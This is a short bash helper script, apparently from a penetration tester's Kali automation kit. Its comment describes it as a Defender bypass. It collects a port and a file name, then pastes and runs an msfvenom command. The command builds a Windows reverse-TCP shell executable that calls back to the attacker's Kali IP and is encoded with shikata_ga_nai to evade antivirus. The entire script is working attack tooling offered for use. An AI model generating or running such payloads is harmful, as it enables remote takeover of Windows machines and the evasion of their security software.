#!/bin/bash

: '
defender bypass with x86/shikata_ga_nai for .exe
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "LPORT" "output file"

LPORT=${form_data["LPORT"]}
OUTPUT_FILE=${form_data["output file"]}

paste_command "msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -b "\x00" -e x86/shikata_ga_nai -f exe -o ${OUTPUT_FILE}"
xdotool key Return